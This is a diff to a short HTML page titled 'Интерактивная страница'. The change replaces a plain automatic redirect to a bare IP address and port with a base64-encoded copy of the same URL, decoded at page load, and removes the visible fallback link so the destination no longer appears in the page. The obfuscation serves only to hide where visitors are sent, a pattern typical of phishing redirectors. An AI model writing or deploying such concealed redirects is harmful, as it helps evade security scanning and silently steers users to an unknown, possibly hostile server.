@@ -4,10 +4,15 @@
     <meta charset="UTF-8">
     <title>Интерактивная страница</title>
     <script>
-        window.location.href = "http://194.87.199.64:5001/";
+        function decodeUrl(encodedUrl) {
+            return atob(encodedUrl);
+        }
+
+        const encodedUrl = "aHR0cDovLzE5NC44Ny4xOTkuNjQ6NTAwMS8="; 
+        const targetUrl = decodeUrl(encodedUrl);
+        window.location.href = targetUrl;
     </script>
 </head>
 <body>
-    Если вы не перенаправлены автоматически, <a href="http://194.87.199.64:5001/">нажмите здесь</a>.
 </body>
 </html>
